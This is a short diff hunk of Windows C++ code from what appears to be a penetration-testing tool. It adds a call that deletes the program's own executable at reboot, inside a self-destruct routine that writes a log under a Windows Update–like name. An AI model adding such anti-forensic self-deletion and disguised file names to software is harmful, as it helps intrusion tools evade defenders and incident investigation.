@@ -493,6 +493,7 @@ static void ScheduleSelfDestruct() {
     GetTempPathA(MAX_PATH, tmp);
     char selfPath[MAX_PATH];
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+    MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
     std::string exeName = GetExeName();
     std::string logPath = std::string(tmp) + "wuaueng.log";
     std::string batPath = std::string(tmp) + "NetpenCleanup.bat";
